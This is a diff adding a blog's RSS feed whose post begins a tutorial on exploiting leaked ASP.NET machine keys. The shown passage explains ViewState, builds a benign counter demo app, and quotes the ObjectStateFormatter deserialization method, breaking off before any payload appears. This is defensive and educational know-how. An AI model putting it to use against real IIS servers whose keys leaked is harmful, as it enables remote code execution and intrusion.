@@ -1,0 +1,745 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Meister</title><link>https://meister-arch.github.io/post/</link><description>Recent content in Posts on Meister</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>Meister</copyright><lastBuildDate>Sun, 31 Aug 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://meister-arch.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>Exploiting ASP.NET Leaked Machine Keys</title><link>https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/</link><pubDate>Sun, 31 Aug 2025 00:00:00 +0000</pubDate><guid>https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/</guid><description>&lt;img src="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/featured.png" alt="Featured image of post Exploiting ASP.NET Leaked Machine Keys" />&lt;h2 id="intro">Intro
+&lt;/h2>&lt;p>Recently at work, I participated in a purple teaming exercise that was focused on IIS compromise. In this scenario the web.config of the server had been leaked and the question was: what an attacker could do with this information? My eyes went straight the db credentials and I called it a day.&lt;/p>
+&lt;p>Well, db credentials wasn&amp;rsquo;t the worse part. You know that if the asp.net machine keys are leaked, this can turn into a RCE?&lt;/p>
+&lt;p>This is the story behind this blog post. Of course it is not a new technique, but I would like to share my understanding of the subject and use it as my first blog post :-)&lt;/p>
+&lt;p>The goal of the post is:&lt;/p>
+&lt;ul>
+&lt;li>Understand what ViewState is.&lt;/li>
+&lt;li>The role of the machine keys.&lt;/li>
+&lt;li>Show how a machine key leak can lead to RCE.&lt;/li>
+&lt;/ul>
+&lt;p>We&amp;rsquo;ll be configuring a PoC server along the way.&lt;/p>
+&lt;h2 id="view-state">View State
+&lt;/h2>&lt;p>Let&amp;rsquo;s start with Microsoft oficial documentation about what is view state:&lt;/p>
+&lt;p>&amp;ldquo;View state is the method that the ASP.NET page framework uses to preserve page and control values between round trips. When the HTML markup for the page is rendered, the current state of the page and values that must be retained during postback are serialized into base64-encoded strings. This information is then put into the view state hidden field or fields.&amp;rdquo;&lt;/p>
+&lt;p>As stated by Microsoft, View State is the mechanism which ASP.NET pages and controls use to mantain the state during postbacks (when we resend a request in the same page to be processed by the server). The term “control” is not very explanatory. Simply put, it refers to elements like a “button” or “text” on an HTML page (&lt;a class="link" href="https://www.tutorialspoint.com/asp.net/asp.net_basic_controls.htm" target="_blank" rel="noopener"
+>see more here&lt;/a>) .The technology was projected to retain the information on the same page rather than cross pages, also solves the problem of HTTP being stateless.&lt;/p>
+&lt;p>The value is stored on the client side through a &amp;ldquo;hidden&amp;rdquo; field called &lt;code>__VIEWSTATE&lt;/code> in HTML, like this:&lt;/p>
+&lt;p>&lt;img src="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/image1.png"
+width="1408"
+height="150"
+srcset="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/image1_hu18ad06606b66ea4d492a5262e5af4a72_18606_480x0_resize_box_3.png 480w, https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/image1_hu18ad06606b66ea4d492a5262e5af4a72_18606_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="figure 1 - view state in HTML"
+class="gallery-image"
+data-flex-grow="938"
+data-flex-basis="2252px"
+>&lt;/p>
+&lt;p>To better understand, let&amp;rsquo;s build a tiny sample app. It&amp;rsquo;s purpose is to count how many times the user clicks the button &amp;ldquo;Increment&amp;rdquo;. Given that HTTP is a stateless protocol, this magic will be done by the view state.&lt;/p>
+&lt;p>On a developer machine with Visual Studio, I will be using the &lt;code>ASP.NET Web Application (.NET Framework)&lt;/code> template.&lt;/p>
+&lt;p>As I am not an ASP.NET developer, with a little googling and chagpt I put together this code:&lt;/p>
+&lt;p>&lt;strong>Front-End&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="err">&amp;lt;&lt;/span>%@ Page Language=&amp;#34;C#&amp;#34; AutoEventWireup=&amp;#34;true&amp;#34; CodeBehind=&amp;#34;Default.aspx.cs&amp;#34; Inherits=&amp;#34;ViewMyState._Default&amp;#34; %&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&amp;lt;!DOCTYPE html&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">head&lt;/span> &lt;span class="na">runat&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;server&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">title&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>ViewState Counter Demo&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">title&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">head&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">form&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;form1&amp;#34;&lt;/span> &lt;span class="na">runat&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;server&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">style&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;font-family:Segoe UI; margin:20px;&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">asp:Label&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">ID&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;lblCount&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">runat&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;server&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">Font-Size&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;Large&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">Text&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;Clicks: 0&amp;#34;&lt;/span> &lt;span class="p">/&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span> &lt;span class="p">/&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span> &lt;span class="p">/&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">asp:Button&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">ID&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;btnIncrement&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">runat&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;server&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">Text&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;Increment&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">OnClick&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;btnIncrement_Click&amp;#34;&lt;/span> &lt;span class="p">/&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">form&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;strong>Back-End&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-C#" data-lang="C#">&lt;span class="line">&lt;span class="cl">&lt;span class="k">using&lt;/span> &lt;span class="nn">System&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">using&lt;/span> &lt;span class="nn">System.Collections.Generic&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">using&lt;/span> &lt;span class="nn">System.Linq&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">using&lt;/span> &lt;span class="nn">System.Web&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">using&lt;/span> &lt;span class="nn">System.Web.UI&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">using&lt;/span> &lt;span class="nn">System.Web.UI.WebControls&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">namespace&lt;/span> &lt;span class="nn">ViewMyState&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">partial&lt;/span> &lt;span class="k">class&lt;/span> &lt;span class="nc">_Default&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Web&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">UI&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Page&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">protected&lt;/span> &lt;span class="k">void&lt;/span> &lt;span class="n">Page_Load&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">object&lt;/span> &lt;span class="n">sender&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">EventArgs&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(!&lt;/span>&lt;span class="n">IsPostBack&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ViewState&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s">&amp;#34;ClickCount&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="m">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">protected&lt;/span> &lt;span class="k">void&lt;/span> &lt;span class="n">btnIncrement_Click&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">object&lt;/span> &lt;span class="n">sender&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">EventArgs&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">count&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">ViewState&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s">&amp;#34;ClickCount&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">count&lt;/span>&lt;span class="p">++;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ViewState&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s">&amp;#34;ClickCount&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">lblCount&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Text&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s">$&amp;#34;Clicks: {count}&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>In Visual Studio &lt;em>Build -&amp;gt; Publish&lt;/em> it is possible to &amp;ldquo;compile&amp;rdquo; this application. There are various options to publish this application, including Azure, Docker, FTP, Folder etc. To save the application locally, I&amp;rsquo;ll be using the Folder option.&lt;/p>
+&lt;p>&lt;img src="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img2.png"
+width="529"
+height="240"
+srcset="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img2_hu384a5c67821f066d14a352e1eb43ca8b_10784_480x0_resize_box_3.png 480w, https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img2_hu384a5c67821f066d14a352e1eb43ca8b_10784_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="figure 2 - Visual Studio Publish "
+class="gallery-image"
+data-flex-grow="220"
+data-flex-basis="529px"
+>&lt;/p>
+&lt;p>The final structure of the folder should be similar to this:&lt;/p>
+&lt;p>&lt;img src="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img3.png"
+width="469"
+height="308"
+srcset="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img3_hu321b06beb3f8ddd19a2b70f6931a4b90_24121_480x0_resize_box_3.png 480w, https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img3_hu321b06beb3f8ddd19a2b70f6931a4b90_24121_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="figure 3 - Folder Structure "
+class="gallery-image"
+data-flex-grow="152"
+data-flex-basis="365px"
+>&lt;/p>
+&lt;p>Transfering this folder to a Windows Server 2022 with IIS installed, I&amp;rsquo;ll create a new site on port 8080. Browsing to it we have this:&lt;/p>
+&lt;p>&lt;img src="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img4.png"
+width="306"
+height="160"
+srcset="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img4_hu89e5cfbaab34f29f28d85f23e041bec3_7470_480x0_resize_box_3.png 480w, https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img4_hu89e5cfbaab34f29f28d85f23e041bec3_7470_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="figure 4 - ViewState Demo "
+class="gallery-image"
+data-flex-grow="191"
+data-flex-basis="459px"
+>&lt;/p>
+&lt;p>Upon clicking &amp;ldquo;Increment&amp;rdquo; the number of clicks increases.&lt;/p>
+&lt;p>&lt;img src="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img5.png"
+width="305"
+height="163"
+srcset="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img5_hub289f9ba960a58e82401974bdbb3c5e6_7526_480x0_resize_box_3.png 480w, https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img5_hub289f9ba960a58e82401974bdbb3c5e6_7526_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="figure 5 - ViewState Demo(2) "
+class="gallery-image"
+data-flex-grow="187"
+data-flex-basis="449px"
+>&lt;/p>
+&lt;p>Using burpsuite, we see that in every response the &lt;code>__VIEWSTATE&lt;/code> is returned by the application:&lt;/p>
+&lt;p>&lt;img src="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img6.png"
+width="640"
+height="271"
+srcset="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img6_hu561ac70af2151999207a196080c06a57_45570_480x0_resize_box_3.png 480w, https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img6_hu561ac70af2151999207a196080c06a57_45570_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="figure 6 - BurpSuite ViewState "
+class="gallery-image"
+data-flex-grow="236"
+data-flex-basis="566px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>It is important to clarify a common misconception: view state is not used to save the values of controls during postback. In reality, these values are loaded during the &amp;ldquo;Load Postback Data&amp;rdquo; phase of the ASP.NET processing pipeline. What needs to be stored in the view state is any programmatic changes to the page&amp;rsquo;s state. Read more about this process in &lt;a class="link" href="https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/ms972976%5c%28v=msdn.10%5c%29" target="_blank" rel="noopener"
+>Understanding ASP.NET View State | Microsoft Learn&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>Ok, at this point we&amp;rsquo;ve seen the practical use of view state. Lets talk a little bit about how the serialization/deserialization process is involved in this subject. I&amp;rsquo;ll skip the crypto aspect of the following methods as it will be covered in the machine keys section.&lt;/p>
+&lt;p>When we send this serialized view state to the application, it will be handled by the &lt;code>ObjectStateFormatter&lt;/code> class, more specifically the &lt;code>Deserialize&lt;/code> method, present on &lt;code>system.web.dll&lt;/code>.&lt;/p>
+&lt;p>In some articles and documentation, it is common to find information that this process is handled by the LOSFormatter class. This is the case when dealing with older ASP.NET (version 1.X). In version 2.0 (and higher), the class being used for this purpose is ObjectStateFormatter &lt;a class="link" href="https://learn.microsoft.com/en-us/aspnet/web-forms/overview/moving-to-aspnet-20/server-controls" target="_blank" rel="noopener"
+>reference&lt;/a>.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-C#" data-lang="C#">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">private&lt;/span> &lt;span class="kt">object&lt;/span> &lt;span class="n">Deserialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span> &lt;span class="n">inputString&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Purpose&lt;/span> &lt;span class="n">purpose&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">String&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">IsNullOrEmpty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">inputString&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ArgumentNullException&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;inputString&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">byte&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="n">inputBytes&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">Convert&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">FromBase64String&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">inputString&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">length&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">inputBytes&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Length&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">object&lt;/span> &lt;span class="n">result&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">MemoryStream&lt;/span> &lt;span class="n">objectStream&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">GetMemoryStream&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">objectStream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">inputBytes&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="m">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">objectStream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Position&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="m">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">Deserialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">objectStream&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">finally&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ReleaseMemoryStream&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">objectStream&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>To demonstrate this, we can use dnspy debuger, attach to the worker process (w3wp.exe) and set a breakpoint on this method. By making a new request we observe that the value being decoded matches the one present in the view state field.&lt;/p>
